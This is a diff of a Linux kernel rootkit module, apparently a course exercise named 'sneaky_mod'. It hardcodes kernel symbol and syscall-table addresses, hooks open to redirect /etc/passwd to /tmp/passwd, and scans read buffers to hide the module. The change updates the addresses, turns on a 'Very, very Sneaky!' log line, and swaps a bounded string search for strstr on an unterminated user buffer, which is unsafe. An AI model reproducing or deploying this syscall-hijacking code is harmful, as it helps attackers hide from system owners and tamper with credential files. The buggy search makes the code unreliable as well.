@@ -34,8 +34,8 @@ MODULE_LICENSE("GPL");
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-206-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073230;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff810731b0;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810731d0;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073150;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
@@ -48,7 +48,7 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00280;
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
 /*This is for #1 #4, which will save the original system call*/
-
+//sudo cat /boot/System.map-4.4.0-209-generic | grep -e set_pages_rw -e set_pages_ro -e sys_call_table
 asmlinkage int (*original_sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 asmlinkage ssize_t (*original_sys_read)(int fd, void * buf, size_t count);
@@ -78,8 +78,8 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  // printk(KERN_INFO "Very, very Sneaky!\n");
-  // Check if the pathname equals to "/etc/passwd"
+  printk(KERN_INFO "Very, very Sneaky!\n");
+  //Check if the pathname equals to "/etc/passwd"
   if(strcmp(pathname, "/etc/passwd") == 0){
     // can use strlen but I want to know correctly that this string end with \0
     copy_to_user((void *)pathname, "/tmp/passwd", 12);
@@ -89,7 +89,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count){
   ssize_t nread = original_sys_read(fd, buf, count);
-  void * start = strnstr(buf, "sneaky_mod", nread);
+  void * start = strstr(buf, "sneaky_mod");
   if(nread <= 0){
     return nread;
   }
